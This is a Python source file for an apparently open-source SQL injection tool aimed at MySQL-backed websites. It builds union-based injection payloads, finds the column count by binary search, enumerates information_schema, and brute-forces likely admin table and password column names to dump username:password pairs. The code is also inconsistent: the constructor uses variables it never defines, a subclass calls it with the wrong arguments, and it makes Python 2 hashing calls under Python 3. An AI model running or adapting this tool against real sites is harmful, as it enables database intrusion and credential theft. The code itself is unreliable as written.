#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Santiago Alessandri
# Matías Fontanini
# Gastón Traberg

import hashlib, dbinterface, urllib.request, urllib.error, urllib.parse, time

class MysqlDumper():
    
    error_list = ['mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_fetch']
    
    def __init__(self, dumper):
        self.dumper = dumper
        url = url.replace(wildcard, separator_list[i] + wildcard)
        self.query = self.find_query(url, wildcard)
        self.verbose = self.is_error_verbose()
    
    def find_query(self, url, wildcard):
        self.comment = self.find_comment(url, wildcard) 
        print('[+] Using comment:', self.comment)
        col_number = self.find_column_count(url, wildcard, self.comment)
        print('[+] Column count in union:', col_number)
        hashes = []
        for i in range(1, col_number+1):  
            hashes.append(self.to_hex(hashlib.md5(str(i)).hexdigest()[:6]))
        response = self.get_requester().request(url.replace(wildcard, ' and 1=0 union all select ' + ','.join(hashes) + self.comment))
        for i in hashes:
            if self.hex_to_string(i) in response:
                self.index = response.find(self.hex_to_string(i))
                return url.replace(wildcard,  ' and 1=0 union all select ' + ','.join(hashes).replace(i, self.field) +  ' from ' + self.table + self.comment)
        raise Exception('Union failed')
        

    def find_column_count(self, url, wildcard, com):
        last = 2
        done = False
        good = hashlib.md5(self.get_requester().request(url.replace(wildcard, ' order by 1' + com))).digest()
        bad  = hashlib.md5(self.get_requester().request(url.replace(wildcard, ' order by 150000' + com))).digest()
        while hashlib.md5(self.get_requester().request(url.replace(wildcard, ' order by ' + str(last) + com))).digest() != bad:
            last *= 2
        pri = last / 2
        while pri < last:
            medio = (pri + last) / 2
            if hashlib.md5(self.get_requester().request(url.replace(wildcard, ' order by ' + str(medio) + com))).digest() != bad:
                pri = medio + 1
            else:
                last = medio
            if pri == last:
                return medio
    
    # Checks if the server is verbose when mysql errors occur
    def is_error_verbose(self):
        # Just a random table name...
        response = self.get_requester().request(self.forge_query('1', 'H817189018fhfhaa'))
        for w in self.error_list:
            if w in response:
                return True
        return False
    
    def get_delimiter(self):
        return self.hex_to_string(self.delimiter)
    
    def hex_to_string(self, string):
        string = string.replace('0x','')
        output = ''
        for i in range(0, len(string), 2):
            output += chr(int(string[i:i+2], 16))
        return output
    
    def to_hex(self, string):
        output = ""
        for i in string:
            output += hex(ord(i)).replace('0x', '')
        return '0x' + output
        
    def get_result_index(self):
        return self.index
    
    def forge_query(self, field, table):
        return self.query.replace(self.field, 'concat(' + field + ',' + self.delimiter + ')').replace(self.table, table)
        
    def forge_indexed_query(self, field, table, index):
        return self.query.replace(self.field, 'concat(' + field + ',' + self.delimiter + ')').replace(self.table, table + ' limit 1 offset ' + str(index))
       
    def adhoc_count_query(self, table):
        return self.forge_query('count(*)', table)
        
    def adhoc_query(self, table, fields, index):
        return self.forge_indexed_query('concat_ws(0x3a,' + ','.join(fields) + ')', table, index)
       
class Mysql5Dumper(MysqlDumper):
    def table_count_query(self):
        return self.forge_query('count(*)', 'information_schema.tables')
        
    def table_name_query(self, index):
        return self.forge_indexed_query('table_name', 'information_schema.tables', index)
        
    def table_columns_count_query(self, table):
        return self.forge_query('count(*)', 'information_schema.columns where table_name = ' + self.to_hex(table))
        
    def table_columns_query(self, table, index):
        return self.forge_indexed_query('column_name', 'information_schema.columns where table_name = ' + self.to_hex(table), index)
        
# Mysql V4 dumper is basically a brute forcer. It tries to brute force the users table name, 
# if it succeeds, the user & password columns are tried to be guessed.
class Mysql4Dumper(MysqlDumper):
    def __init__(self, url, wildcard, delimiter, requester):
        MysqlDumper.__init__(self, url, wildcard, delimiter, requester)
        self.user_table_names = ['admin', 'admins', 'administrators', 'administrator', 'administradores', 
                                 'administrador', 'adm', 'tbladmin', 'tbladmins', 'tbl_admins', 'tbl_admin',
                                 'admin_tbl', 'users', 'user', 'usuarios', 'admin_users', 'users_table', 
                                 'tblusers']
        self.user_columns     = ['username', 'user', 'user_name', 'uname', 'usuario', 'usr', 'usrname', 
                                 'userid', 'u_name', 'user_id', 'uid', 'nom_usuario']
        self.passwd_columns   = ['password', 'passwd', 'pass', 'passw', 'clave']
    
    def guess_table(self):
        i = -1
        hash = self.bad
        while i < len(self.user_table_names) and hash == self.bad:
            i += 1
            print('[i] Trying table', self.user_table_names[i])
            response = self.get_requester().request(self.forge_query('1', self.user_table_names[i]))
            if self.verbose:
                for w in range(len(self.error_list)):
                    if self.error_list[w] in response:
                        break;
                if w == len(self.error_list) - 1:
                    hash = ''
            else:
                hash = hashlib.md5(response).digest()
        return i if i < len(self.user_table_names) else -1

    def guess_column(self, column_list, table):
        i = -1
        hash = self.bad
        while i < len(column_list) and hash == self.bad:
            i += 1
            print('[i] Trying column', column_list[i])
            response = self.get_requester().request(self.forge_query(column_list[i], table))
            if self.verbose:
                for w in range(len(self.error_list)):
                    if self.error_list[w] in response:
                        break;
                if w == len(self.error_list) - 1:
                    hash = ''
            else:
                hash = hashlib.md5(response).digest()
        return i if i < len(column_list) else -1
        
    
    def guess_users_table(self):
        i = self.guess_table()
        if i == -1:
            raise Exception('Users table could not be found by brute force.')
        print('[+] Found table', self.user_table_names[i], end='\n\n')
        j = self.guess_column(self.user_columns, self.user_table_names[i])
        if j == -1:
            raise Exception('User column could not be found by brute force')
        print('[+] Found username column', self.user_columns[j], end='\n\n')
        k = self.guess_column(self.passwd_columns, self.user_table_names[i])
        if k == -1:
            raise Exception('Password column could not be found by brute force.')
        print('[+] Found password column', self.passwd_columns[k], end='\n\n')
        self.columns = 'concat(' + self.user_columns[j] + ',0x3a,' + self.passwd_columns[k]+ ')'
        self.table_name   = self.user_table_names[i]
        
    def guessed_table_count_query(self):
        return self.forge_query('count(*)', self.table_name)

    def guessed_table_query(self, index):
        return self.forge_indexed_query(self.columns, self.table_name, index)
